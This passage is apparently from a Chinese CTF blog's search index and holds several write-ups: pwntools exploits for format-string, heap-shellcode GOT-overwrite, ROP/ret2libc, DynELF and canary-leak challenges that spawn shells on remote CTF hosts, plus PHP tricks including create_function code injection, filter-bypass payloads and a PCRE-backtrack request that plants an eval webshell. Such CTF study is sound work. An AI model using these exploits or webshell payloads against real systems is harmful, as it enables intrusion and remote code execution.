remote(&#x27;111.200.241.244&#x27;, 52730)context.arch = &#x27;i386&#x27;context.os = &#x27;linux&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]shellcode_addr = 0x804A8A0r.sendline(base64.b64encode(b&#x27;%4$p&#x27;))ret_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)+4print(hex(ret_addr))shellcode = asm(shellcraft.sh())payload = shellcode+b&#x27;%&#x27; + \\    bytes(str((ret_addr &amp; 0xff)-len(shellcode)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%4$hhn%&#x27; + \\    bytes(str((shellcode_addr &amp; 0xff)-(ret_addr &amp; 0xff)),          encoding=&#x27;utf8&#x27;)+b&#x27;c%12$hn&#x27;payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n参考文章https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"note-service2","url":"/2021/10/29/note-service2/","content":"检查保护\n开启了canary和pie但是没有开启nx，所以堆栈可以执行\n程序执行流程分析一道经典的菜单题目，具体流程可以看题目我在这里只放上有漏洞的代码\n有四个选项，一是增加note，二和三都还没完成，第四就是删掉note\n__int64 sub_CA5()&#123;  __int64 result; // rax  int v1; // [rsp+8h] [rbp-8h]  unsigned int v2; // [rsp+Ch] [rbp-4h]  result = (unsigned int)dword_20209C;  if ( dword_20209C &gt;= 0 )  &#123;    result = (unsigned int)dword_20209C;    if ( dword_20209C &lt;= 11 )    &#123;      printf(&quot;index:&quot;);      v1 = sub_B91();      printf(&quot;size:&quot;);      result = sub_B91();      v2 = result;      if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 8 )      &#123;        qword_2020A0[v1] = malloc((int)result);        if ( !qword_2020A0[v1] )        &#123;          puts(&quot;malloc error&quot;);          exit(0);        &#125;        printf(&quot;content:&quot;);        sub_B69(qword_2020A0[v1], v2);        result = (unsigned int)++dword_20209C;      &#125;    &#125;  &#125;  return result;&#125;\n\n在增加note的时候，首先输入索引值，然后创建一个chunk但是chunk的大小最大为8，又因为程序是堆栈可以执行所以考虑把shellcode写到堆当中。\nexecve对应的系统调用号是59所以amd64的shellcode需要完成的操作是:\nrax = 59rdi = &#x27;/bin/sh&#x27;rsi = 0rdx = 0syscall\n\n这肯定是超过了8字节，所以需要创建多个chunk然后连接起来，通过jmp连接，当我们malloc一个大小为8的chunk的时候他的结构其实是这样\n\n这样一个chunk里面只有fd的位置是我可以控制的，并且在我们可以控制的最后一个字节会被改写成0，所以我们实际可以控制的只有7个字节在构造的时候需要jmp的距离为bk+prev_size+size+1的大小。\n.text:0000000000000B1E                 jmp     short loc_B42.text:0000000000000B20 ; ---------------------------------------------------------------------------.text:0000000000000B20.text:0000000000000B20 loc_B20:                                ; CODE XREF: sub_AC3+49↑j.text:0000000000000B20                 mov     eax, [rbp+var_C].text:0000000000000B23                 movsxd  rdx, eax.text:0000000000000B26                 mov     rax, [rbp+var_18].text:0000000000000B2A                 add     rdx, rax.text:0000000000000B2D                 movzx   eax, [rbp+buf].text:0000000000000B31                 mov     [rdx], al.text:0000000000000B33                 add     [rbp+var_C], 1.text:0000000000000B37.text:0000000000000B37 loc_B37:                                ; CODE XREF: sub_AC3+2A↑j.text:0000000000000B37                 mov     eax, [rbp+var_1C].text:0000000000000B3A                 sub     eax, 1.text:0000000000000B3D                 cmp     eax, [rbp+var_C].text:0000000000000B40                 jg      short loc_AEF.text:0000000000000B42.text:0000000000000B42 loc_B42:  \n\n之间相差0x24个字节但是十六进制当中\n0000000000000B10  F4 48 63 D0 48 8B 45 E8  48 01 D0 C6 00 00 EB 22  ....H.E.........\n\n指令为0x22个字节，所以jmp short的跳跃数其实就是目标地址-当前地址-jmp short的大小\n所以跳跃的距离实际计算方式是bk+prev_size+size+1+2-2=0x19\n分析利用方式有了上面的思路，就需要想怎么往rdi放入’/bin/sh’了可以看到这个函数atoi(nptr);调用方式跟system一样并且nptr是可控的，那么就可以想到是篡改got表了\n.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r.got.plt:0000000000202068 _got_plt        ends.got.plt:0000000000202068.data:0000000000202070 ; ===========================================================================.data:0000000000202070.data:0000000000202070 ; Segment type: Pure data.data:0000000000202070 ; Segment permissions: Read/Write.data:0000000000202070 _data           segment qword public &#x27;DATA&#x27; use64.data:0000000000202070                 assume cs:_data.data:0000000000202070                 ;org 202070h.data:0000000000202070                 db    0.data:0000000000202071                 db    0.data:0000000000202072                 db    0.data:0000000000202073                 db    0.data:0000000000202074                 db    0.data:0000000000202075                 db    0.data:0000000000202076                 db    0.data:0000000000202077                 db    0.data:0000000000202078 ; void *off_202078.data:0000000000202078 off_202078      dq offset off_202078    ; DATA XREF: sub_A10+17↑r.data:0000000000202078                                         ; .data:off_202078↓o.data:0000000000202078 _data           ends.data:0000000000202078.bss:0000000000202080 ; ===========================================================================.bss:0000000000202080.bss:0000000000202080 ; Segment type: Uninitialized.bss:0000000000202080 ; Segment permissions: Read/Write.bss:0000000000202080 _bss            segment align_32 public &#x27;BSS&#x27; use64.bss:0000000000202080                 assume cs:_bss.bss:0000000000202080                 ;org 202080h.bss:0000000000202080                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202080                 public __bss_start.bss:0000000000202080 ; FILE *_bss_start.bss:0000000000202080 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000000480↑o.bss:0000000000202080                                         ; LOAD:0000000000000498↑o ....bss:0000000000202080                                         ; Alternative name is &#x27;_edata&#x27;.bss:0000000000202080                                         ; stdout.bss:0000000000202080                                         ; _edata.bss:0000000000202080                                         ; Copy of shared data.bss:0000000000202088                 align 10h.bss:0000000000202090                 public stdin.bss:0000000000202090 ; FILE *stdin.bss:0000000000202090 stdin           dq ?                    ; DATA XREF: LOAD:00000000000004C8↑o.bss:0000000000202090                                         ; sub_A80+4↑r.bss:0000000000202090                                         ; Copy of shared data.bss:0000000000202098 byte_202098     db ?                    ; DATA XREF: sub_A10↑r.bss:0000000000202098                                         ; sub_A10+29↑w.bss:0000000000202099                 align 4.bss:000000000020209C dword_20209C    dd ?                    ; DATA XREF: sub_CA5+8↑r.bss:000000000020209C                                         ; sub_CA5+16↑r ....bss:00000000002020A0 ; _QWORD qword_2020A0[12].bss:00000000002020A0 qword_2020A0    dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o\n\n可以看到堆最开始的地方和我们需要修改的位置距离为0x40字节，最上面的漏洞函数里面数组的索引是没有检测的，那dword_20209C[-8]也就是atoi函数got表的内容，并且不能一开是就修改，因为我们后面写shellcode是还需要atoi函数的\nshellcode写法在文章上面是写了我们要getshell需要的操作:\nmov rax,59mov rsi,0mov rdx,0syscall# rdi由我们自己写用atoi写入\n\n但是问题就出来了，上面的三条指令都已经是7字节了，所以我们需要将命令拆开\nxor rax,raxmov eax,59xor rsi,rsixor rdx,rdx\n\nexpfrom pwn import *elf = ELF(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57872)# r = process(&#x27;./questions/1f10c9df3d784b5ba04b205c1610a11e&#x27;)context.arch = &#x27;amd64&#x27;# context.log_level = &#x27;debug&#x27;def add_note(index, content):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(8), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def del_note(index):    r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))code0 = asm(&#x27;xor rax,rax&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code1 = asm(&#x27;mov eax,0x3b&#x27;)+b&#x27;\\xeb\\x19&#x27;code2 = asm(&#x27;xor rsi,rsi&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code3 = asm(&#x27;xor rdx,rdx&#x27;)+b&#x27;\\x90\\x90\\xeb\\x19&#x27;code4 = asm(&#x27;syscall&#x27;).ljust(7, b&#x27;\\x90&#x27;)# 这里\\x90是nop指令add_note(0, code0)add_note(1, code1)add_note(2, code2)add_note(3, code3)add_note(4, code4)del_note(0)add_note(-8, code0)r.recvuntil(b&#x27;your choice&gt;&gt; &#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n\n\n\n\n","categories":["pwn-xctf"],"tags":["篡改got表"]},{"title":"ctf中php常被我忽略的细节","url":"/2021/09/17/php-detail/","content":"\nsession操作\n\n&lt;?php   \t//在最开始使用session_start();    session_start();\t//根据用户传到后台的sessionId找到相应的文件，可以在phpinfo()里找到session_save_path\t$_SEESION[&#x27;username&#x27;]//可以访问到文件中存放的session值?&gt;\n\n&lt;?php    //在存放session时比如    $_SEESION[&#x27;username&#x27;]=&quot;admin&quot;    //在本地文件中的存放形式为：username|s:5:&quot;admin&quot;    //当中的`|`为键值对的符号\n\n\ncreate_function绕过\n\n&lt;?php    //在php里面有create_function方法    create_function(&quot;$a,$b&quot;,&quot;return $a*$b&quot;);?&gt;以上代码等价于&lt;?php    function name($a,$b)&#123;    return $a*$b;\t&#125;\t//所以就有了思路去绕过\t//假如上传的请求体的参数会占据create_function里面的任意的一个参数\t$a=$_GET[&#x27;id&#x27;];\tcreate_function($a,&quot;&quot;);?&gt;使用payload:&#x27;)&#123;&#125;执行代码;//&#x27;&lt;?php    //产生的结果就为    function name()&#123;&#125;执行代码;//&#123;&#125;?&gt;当然在后面的那一个参数也可以类比了payload:&#x27;&#125;code;//&#x27;&lt;?php    function name()&#123;&#125;code;//&#125;?&gt;\n\n\n绕过preg_match\n\n&lt;?php    preg_match(&quot;/^[0-9,a-z_]$/isD&quot;)    //在绕过这个函数的时候应为后面存在s所以可以尝试?&gt;可用python写脚本找到断点\n\nimport requestsfor i in range(256):    var=hex(i)[2:]    if(len(var)&lt;2):        var=&quot;0&quot;+var    var=&quot;%&quot;+var    url=&quot;http://172.17.0.2/study/php_view/test.php?wow=&quot;+var+&quot;b=dzhsb&quot;    res=requests.get(url=url).text    if(&quot;dzhsb&quot; in res):        print(url)        break# 可以获得断点# 如果用.进行任意字符匹配可以用%0a换行符绕过\n\n\n正则表达式的字符类\n\n[:alpht:]匹配所有的字母;[:upper:]匹配所有的大写字母;[:lower:]匹配所有的小写字母;[:digit:]匹配所有数字;[:alnum:]匹配所有数字、字母;[:xdigit:]匹配任何十六进制数字;[:space:]匹配制表符，换行符，垂直制表符，换页，回车或空格;[:blank:]匹配空格或制表符;[:print:]匹配任何可打印的字符;[:punct:]匹配任何标点符号;[:graph:]匹配任何可打印但是除了空格类字符那些;[:word:]匹配字母数字字符和下划线的连续字符串;[:ascii:]匹配ascii码为0-127的字符;[:cntrl:]不属于字符类的任何字符:[:upper:],[:lower:],[:alpha:],[:digit:],[:punct:],[:graph:],[:print:],[:xdigit:];\n\n\n绕过一些关键词popen\n\n若是tail cat被过滤可用tacphp命令执行的代码passthru()函数localeconv()这个函数在不传递参数的情况下是返回&#x27;.&#x27;但是数据类型为数组,使用current()可以读取.&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;这样的正则表达式可以通过的为a(b(c()))一直套娃下去都可以通过strcpm绕过:\t数组的返回值会报错md5绕过(弱类型):\ts1502113478a    0e861580163291561247404381396064    s1885207154a    0e509367213418206700842008763514    s1836677006a    0e481036490867661113260034900752    s155964671a    0e342768416822451524974117254469    s1184209335a    0e072485820392773389523109082030\n\n\nphp原生类\n\n操作文件的原生类\n$test=new SplFileObject(filename,mode=&quot;r&quot;);var_dump($test-&gt;fpassthru());可以读取文件\n\n\nintval函数\n\nphp5    intval(&#x27;1e10&#x27;)--&gt;1    intval(&#x27;1e10&#x27;+1)--&gt;10000000php7行不通\n\n\nmt_rand()伪随机漏洞\n\n对于php的mt_rand产生的随机数实际上是受mt_srand种子(seed)所影响的\n\n会产生这样存在线性关系的随机数，可以同通过脚本暴力破解\na = &#x27;2BnGu1TiNa&#x27;b = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;res = &#x27;&#x27;# print(len(b))for i in range(len(a)):    for j in range(len(b)):        if a[i] == b[j]:            res += str(j)+&#x27; &#x27;+str(j)+&#x27; 0 &#x27;+str(len(b))+&#x27; &#x27;            breakprint(res)#得到每个字符位于的位置，然后通过这种傻逼的组合方式\n\n随后通过php_mt_seed爆出seed\n$ ./php_mt_seed 28 28 0 61 37 37 0 61 13 13 0 61 42 42 0 61 20 20 0 61 27 27 0 61 55 55 0 61 8 8 0 61 49 49 0 61 0 0 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 1142.7 Mseeds/s Version: 5.2.1+Found 0, trying 0x0a000000 - 0x0bffffff, speed 108.9 Mseeds/s seed = 0x0a552021 = 173350945 (PHP 7.1.0+)Found 1, trying 0xfe000000 - 0xffffffff, speed 102.6 Mseeds/s Found 1\n\n得到seed之后再用php就可以跑出来了\n&lt;?php$x = 12;mt_srand(173350945);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str = &#x27;&#x27;;$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123;    $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;\n\n\n PHP利用PCRE回溯次数限制绕过某些安全限制\n\n&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;/&lt;\\?.*[(`;?&gt;].*/is&#x27;, $data);  &#125;if(!is_php($input)) &#123;    fwrite($f, $input); ...&#125;在is_php为false的时候可以写入webshell\n\n在正则函数匹配的时候会进行以下操作\n\n官方给出的回溯上限为1000000次，若是超出这个次数就会返回false\n所以可以给出对应的poc\nimport requestsfiles = &#123;  &#x27;file&#x27;: (&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27; + &#x27;a&#x27; * 1000000)&#125;res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)print(res.headers)\n\n\n一些trick小技巧\n\n这类情况;if (preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $arg))&#123;    dir(&#x27;nonono!&#x27;);&#125;else&#123;    //There is no code to print flag in flag.php    $func(&#x27;&#x27;, $arg);&#125;// $func和$arg可控的话// $func = create_function// $arg = ;&#125; include(base64_decode(ZmxhZy5waHA=));var_dump(get_defined_vars());/*   就可以绕过了\n\n","categories":["web"],"tags":["php"]},{"title":"pwn-100","url":"/2021/09/20/pwn-100/","content":"获取程序信息\n是六十四位程序，小端序，没有开起栈溢出保护\n反编译分析程序程序源码:\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  sub_40068E();  return 0LL;&#125;\n\nint sub_40068E()&#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);&#125;\n\n__int64 __fastcall sub_40063D(__int64 a1, signed int a2)&#123;  __int64 result; // rax  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  &#123;    result = i;    if ( (signed int)i &gt;= a2 )      break;    read(0, (void *)((signed int)i + a1), 1uLL);  &#125;  return result;&#125;\n\n在ida pro里面没找到system函数，也没找到”/bin/sh”字符串。所以就该开始构造ROP\n64位的程序在进行ROP与32不一样，64位的参数放在寄存器(我好像上一篇提到过)，使用ROPgadegt\n\n找到符合要求的汇编指令，后续就直接开始pwn它\ngetshellexp脚本\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/bee9f73f50d2487e911da791273ae5a3&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53172)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]pop_rdi_ret_addr = 0x0000000000400763main_addr = 0x4006b8payload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)payload = payload.ljust(200, b&#x27;a&#x27;)r.send(payload)print(r.recvline())real_puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)libc_system_addr = libc.dump(&#x27;system&#x27;)libc_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)libc_puts_addr = libc.dump(&#x27;puts&#x27;)offset = real_puts_addr - libc_puts_addrreal_system_addr = offset + libc_system_addrreal_shell_addr = offset + libc_shell_addrpayload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)payload = payload.ljust(200, b&#x27;a&#x27;)r.send(payload)r.interactive()\n\n\n\n\n\n今天的比赛属实搞人心态，那个pwn的题目一直存在栈未对齐，是我太菜了分析不到原因，等等明天的wp吧。\n","categories":["pwn-xctf"],"tags":["ROP| pwn"]},{"title":"pwn-200","url":"/2021/10/26/pwn-200/","content":"检查保护\n32位，没开canary和PIE\n利用过程int __cdecl main()&#123;  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF  strcpy(buf, &quot;Welcome to XDCTF2015~!\\n&quot;);  memset(&amp;buf[24], 0, 0x4Cu);  setbuf(stdout, buf);  write(1, buf, strlen(buf));  sub_8048484();  return 0;&#125;ssize_t sub_8048484()&#123;  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF  setbuf(stdin, buf);  return read(0, buf, 0x100u);&#125;\n\n很明显的栈溢出，但是没有直接可以用的system和/bin/sh所以构造rop，这个题跟以往的很烦的一点就是，他的libc文件我用LibcSearcher就是找不到，在找不到的情况下，使用pwntools提供的DynELF来getshell，但是这个好像不能找到字符串所以下面是把字符串写到bss段当中然后执行system就行\nexpfrom pwn import *# r = remote(&#x27;111.200.241.244&#x27;, 51421)r = process(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)elf = ELF(&#x27;./questions/bed0c68697f74e649f3e1c64ff7838b8&#x27;)write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss_addr = elf.bss()padding = (0x6c+4)*b&#x27;a&#x27;main_addr = 0x080484BEppp_addr = 0x080485cddef leak(address):    payload = padding+p32(write_plt)+p32(main_addr)+p32(1)+p32(address)+p32(4)    r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)    return r.recv(4)d = DynELF(leak, elf=elf)sys_addr = d.lookup(b&#x27;system&#x27;, &#x27;libc&#x27;)payload = padding+p32(read_plt)+p32(sys_addr)+p32(0)+p32(bss_addr)+p32(8)r.sendafter(b&quot;Welcome to XDCTF2015~!\\n&quot;, payload)r.send(b&quot;/bin/sh\\x00&quot;)r.interactive()\n","categories":["pwn-xctf"],"tags":["stack overflow"]},{"title":"pwn_实时数据监测","url":"/2021/09/23/pwn-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/","content":"程序保护和流程\n啥都没开\n反汇编代码int __cdecl main(int argc, const char **argv, const char **envp)&#123;  locker();  return 0;&#125;\n\nint locker()&#123;  int result; // eax  char s; // [esp+0h] [ebp-208h]  fgets(&amp;s, 0x200, stdin);  imagemagic(&amp;s);  if ( key == 35795746 )    result = system(&quot;/bin/sh&quot;);  else    result = printf(format, &amp;key, key);  return result;&#125;\n\nint __cdecl imagemagic(char *format)&#123;  return printf(format);&#125;\n\n看程序栈 fgets 达不到栈溢出的要求，然后调用了 imagemagic 的函数其实就是调用 printf，第一反应就是格式化字符串漏洞(我中途想着想着就想到栈迁移劫持程序流，我是傻逼)\n然后就是要是 key==35795746 的话就可以 getshell 了。key 是 bss 段上的全局变量会在不等于的时候打印出地址和值\n\n利用过程首先使用\npayload=b&#x27;aaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p&#x27;\n\n\n得出偏移量为 12，但是要是直接搞进去的话程序直接崩溃了。\n解法一按照字节写入\npayload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;\n\n所以写入的字节就是\n\n18+4*4=34=0x22 17+34=51=0x33 239+51=290=0x122 224+290=514=0x202\n所以在内存的存储就是\n22 33 22 02\n合并起来就是 0x02223322\n\n解法二直接使用 pwntools 的函数 fmtstr_payload\n最终 exp\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 64783)# r = process(&#x27;./questions/9926c1a194794984978011fc619e3301&#x27;)key_addr = 0x0804a048key_value = 0x02223322# payload = fmtstr_payload(12, &#123;key_addr: key_value&#125;)payload = p32(key_addr)+p32(key_addr+1)+p32(key_addr+2) + \\    p32(key_addr+3)+b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;r.sendline(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"pwn1_sctf_2016","url":"/2021/09/19/pwn1-sctf-2016/","content":"获取程序信息\nNX被打开，没有canary保护栈。\n\n调用一下是这样子的\nIDA静态分析\nmain函数执行了vuln然后看到有get_flag，应该就是在vuln发生栈溢出然后调用get_flag。\nvuln函数的内容:\nint vuln()&#123;  const char *v0; // eax  char s; // [esp+1Ch] [ebp-3Ch]  char v3; // [esp+3Ch] [ebp-1Ch]  char v4; // [esp+40h] [ebp-18h]  char v5; // [esp+47h] [ebp-11h]  char v6; // [esp+48h] [ebp-10h]  char v7; // [esp+4Fh] [ebp-9h]  printf(&quot;Tell me something about yourself: &quot;);  fgets(&amp;s, 32, edata);  std::string::operator=(&amp;input, &amp;s);  std::allocator&lt;char&gt;::allocator(&amp;v5);  std::string::string(&amp;v4, &quot;you&quot;, &amp;v5);  std::allocator&lt;char&gt;::allocator(&amp;v7);  std::string::string(&amp;v6, &quot;I&quot;, &amp;v7);  replace((std::string *)&amp;v3);  std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);  std::string::~string((std::string *)&amp;v3);  std::string::~string((std::string *)&amp;v6);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  std::string::~string((std::string *)&amp;v4);  std::allocator&lt;char&gt;::~allocator(&amp;v5);  v0 = (const char *)std::string::c_str((std::string *)&amp;input);  strcpy(&amp;s, v0);  return printf(&quot;So, %s\\n&quot;, &amp;s);&#125;\n\n发现看不懂，完全不知道啥意思，但是可以看到，&amp;s只允许输入32字节的长度，但是栈的情况\ngdb动态分析\n偏移量是64字节，所以无论怎样都无法溢出，然后看见有一个”I”和一个”you”。作为web出生的选手一下子就想到了反序列化因为替换字符导致绕过，这里估计也是一样，然后gdb调式验证一下。\n\n在这里输入五个”I”\n\n可以看到printf答应出来的都是’youyouyouyouyou’了，在栈上也是一样的，变成了五个”you”，从一个字节变到三个字节，找到栈溢出了。\nget_flagexp.py\nfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;x86&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/pwn1_sctf_2016&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29915)flag_addr = elf.symbols[&#x27;get_flag&#x27;]payload = b&#x27;I&#x27;*(21)+b&#x27;a&#x27; + p32(flag_addr)# r.recvuntil(&#x27;Tell me something about yourself:&#x27;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["stack overflow"]},{"title":"pwn1","url":"/2021/10/27/pwn1/","content":"保护检查\n开启了canary\n执行流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    sub_4008B9();    v3 = sub_400841();    switch ( v3 )    &#123;      case 2:        puts(s);        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);        break;      default:        sub_400826(&quot;invalid choice&quot;);        break;    &#125;    sub_400826(&amp;unk_400AE7);  &#125;&#125;\n\n就是选择然后执行相应的内容，很明显在选择1的时候存在栈溢出，但是puts是遇到”\\0”时停止输出，所以可以利用puts泄漏出canary然后栈溢出。思路很简单直接给exp\nfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./questions/babystack&quot;)r = remote(&#x27;111.200.241.244&#x27;, 56538)payload = b&#x27;a&#x27;*(0x90-0x8)pop_rdi_addr = 0x0000000000400a93puts_plt_addr = elf.plt[&#x27;puts&#x27;]puts_got_addr = elf.got[&#x27;puts&#x27;]main_addr = 0x0000000000400908r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)# print(r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;))r.recvuntil(b&#x27;aaaaaaaa\\n&#x27;)# print((r.recvuntil(b&#x27;\\n&#x27;).ljust(8, b&#x27;\\0&#x27;)))# print(u64(r.recv(7).ljust(8, b&#x27;\\0&#x27;)))canary = u64(r.recv(7).rjust(8, b&#x27;\\0&#x27;))payload += p64(canary)+b&#x27;a&#x27;*0x8+p64(pop_rdi_addr)+p64(puts_got_addr) + \\    p64(puts_plt_addr)+p64(main_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)# print(u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;)))real_puts_addr = u64(r.recvline()[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_puts_addr)offset = real_puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc.dump(&#x27;system&#x27;)+offsetbin_sh_addr = libc.dump(&#x27;str_bin_sh&#x27;)+offsetpayload = b&#x27;a&#x27;*(0x90-0x8)+p64(canary)+b&#x27;a&#x27;*0x8 + \\    p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["canary"]},{"title":"强网杯_2019_Upload","url":"/2021/09/24/qwb-2019-Upload/","content":"获取题目信息点是题目是登录注册窗口，随便注册进入，发现里面是一个上传文件页面，上传之后，就会进入到假想的聊天页面，观察url地址都是index.php/home这种类型的一般来说就是thinkphp了，然后找不到东西了，就开始扫。\n\n扫出来两个敏感信息，robots.txt里面什么都没有，www.tar.gz直接源码泄漏开始代码审计。\n分析源码查看了几个控制器，在Profile控制器找到了漏洞。\npublic function upload_img()&#123;    if($this-&gt;checker)&#123;        if(!$this-&gt;checker-&gt;login_check())&#123;            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;            $this-&gt;redirect($curr_url,302);            exit();        &#125;    &#125;    if(!empty($_FILES))&#123;        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;        $this-&gt;ext_check();    &#125;    if($this-&gt;ext) &#123;        if(getimagesize($this-&gt;filename_tmp)) &#123;            @copy($this-&gt;filename_tmp, $this-&gt;filename);             // 在这里会将前一个文件复制到后一个文件，那么我们只需要上传一个图片马，然后将图片马的数据随便新建一个php文件就可以getshell了            @unlink($this-&gt;filename_tmp);            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;            $this-&gt;update_img();        &#125;else&#123;            $this-&gt;error(&#x27;Forbidden type!&#x27;, 